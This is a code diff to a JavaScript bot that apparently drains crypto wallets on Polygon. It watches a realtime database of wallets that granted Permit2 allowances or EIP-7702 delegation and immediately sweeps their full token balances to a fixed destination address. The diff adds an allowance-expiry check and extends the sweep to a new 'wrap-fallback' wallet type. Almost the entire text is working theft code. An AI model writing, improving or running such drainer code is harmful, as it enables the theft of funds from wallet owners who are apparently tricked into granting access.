@@ -34,7 +34,7 @@ const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
 const CHAIN                     = process.env.CHAIN || "polygon";
 
 const PERMIT2_ADDRESS   = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const MIN_ETH_WEI       = ethers.parseEther("0.001");
+const MIN_ETH_WEI       = ethers.parseEther("0.5")   // 0.5 MATIC min reserve;
 const MIN_TOKEN_UNITS   = "0.5";
 const SWEEP_COOLDOWN_MS = 30_000; // 30s per-wallet cooldown — Polygon blocks ~2s
 const TOKEN_CALL_DELAY  = 50;    // ms after each token call
@@ -83,10 +83,11 @@ const ERC20_ABI = [
   "function symbol() view returns (string)",
 ];
 
-// Permit2 AllowanceTransfer — bot calls transferFrom after user set allowance.
-// No signature needed. amount is uint160 (cast balance to uint160 before call).
+// Permit2 AllowanceTransfer — bot checks stored allowance then calls transferFrom.
+// No signature needed. amount is uint160. allowance() returns (amount, expiration, nonce).
 const PERMIT2_ABI = [
   "function transferFrom(address from, address to, uint160 amount, address token) external",
+  "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)",
 ];
 
 // ── Wallet & contracts — ALL bound to rpcProvider (HTTP) ─────────────────────
@@ -267,8 +268,9 @@ async function sweepPermit2Wallet(walletAddress) {
   }
 
   log(`[permit2] checking ${tokenList.length} token(s) for ${checksum}`);
+  const nowSecs = BigInt(Math.floor(Date.now() / 1000));
 
-  // Check balances sequentially, call transferFrom for each token with balance
+  // Check allowance + balance sequentially, then call transferFrom per token
   for (const rawAddress of tokenList) {
     const tokenAddress = normalizeAddress(
       typeof rawAddress === "string" ? rawAddress : rawAddress.address || rawAddress.token
@@ -276,6 +278,23 @@ async function sweepPermit2Wallet(walletAddress) {
     if (!tokenAddress) continue;
 
     try {
+      // Verify Permit2 allowance is set and not expired before any balance check
+      let allowanceOk = false;
+      try {
+        const [allowedAmount, expiration] = await permit2.allowance(
+          checksum, tokenAddress, relayerWallet.address
+        );
+        allowanceOk = allowedAmount > 0n && expiration > nowSecs;
+        if (!allowanceOk) {
+          warn(`[permit2] ${tokenAddress.slice(0, 10)}: allowance not set or expired for ${checksum} — user must reconnect`);
+          await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
+          continue;
+        }
+      } catch {
+        // allowance() call failed — try transferFrom anyway (non-fatal)
+        allowanceOk = true;
+      }
+
       const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
       const balance = await token.balanceOf(checksum);
 
@@ -290,11 +309,10 @@ async function sweepPermit2Wallet(walletAddress) {
       log(`[permit2] ${checksum} ${symbol} balance=${ethers.formatUnits(balance, 18)} — transferFrom`);
 
       const fee = await getFeeData();
-      // amount is uint160 — balance fits (uint256 token balances never exceed uint160 in practice)
-      const tx = await permit2.transferFrom(
+      const tx  = await permit2.transferFrom(
         checksum,
         DESTINATION_ADDRESS,
-        balance,
+        balance,          // uint160 — token balances never exceed uint160 in practice
         tokenAddress,
         { gasLimit: 150_000n, ...fee }
       );
@@ -303,8 +321,8 @@ async function sweepPermit2Wallet(walletAddress) {
       log(`[permit2] confirmed — ${symbol} swept for ${checksum}`);
     } catch (e) {
       const msg = e.message ?? "";
-      if (msg.includes("InsufficientAllowance") || msg.includes("allowance")) {
-        warn(`[permit2] ${tokenAddress}: no Permit2 allowance for ${checksum} — user must reconnect`);
+      if (msg.includes("InsufficientAllowance") || msg.includes("INSUFFICIENT_ALLOWANCE")) {
+        warn(`[permit2] ${tokenAddress}: insufficient allowance for ${checksum} — user must reconnect`);
       } else if (msg.includes("InsufficientBalance") || msg.includes("balance")) {
         // Balance changed between check and tx — harmless
       } else {
@@ -359,7 +377,7 @@ function subscribeRealtime() {
         const isNew = !delegatedWallets.has(address);
         delegatedWallets.set(address, type);
         log(`🔔 Realtime ${isNew ? "new" : "updated"} wallet ${address} (${type}) — sweeping immediately`);
-        if (type === "permit2") {
+        if (type === "permit2" || type === "wrap-fallback") {
           await sweepPermit2Wallet(address).catch(e => err(`permit2 sweep: ${e.message}`));
         } else {
           await sweepDelegatedWallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
@@ -378,7 +396,7 @@ function subscribeRealtime() {
         if (!address) return;
         delegatedWallets.set(address, type);
         log(`🔄 Realtime wallet update ${address} (${type}) — sweeping immediately`);
-        if (type === "permit2") {
+        if (type === "permit2" || type === "wrap-fallback") {
           await sweepPermit2Wallet(address).catch(e => err(`permit2 sweep: ${e.message}`));
         } else {
           await sweepDelegatedWallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
@@ -440,7 +458,8 @@ async function startBot() {
         for (const walletAddress of due) {
           const walletType = delegatedWallets.get(walletAddress);
           try {
-            if (walletType === "permit2") {
+            if (walletType === "permit2" || walletType === "wrap-fallback") {
+              // wrap-fallback = same as permit2 (WBNB/WETH/WMATIC in token list)
               await sweepPermit2Wallet(walletAddress);
             } else {
               await sweepDelegatedWallet(walletAddress);
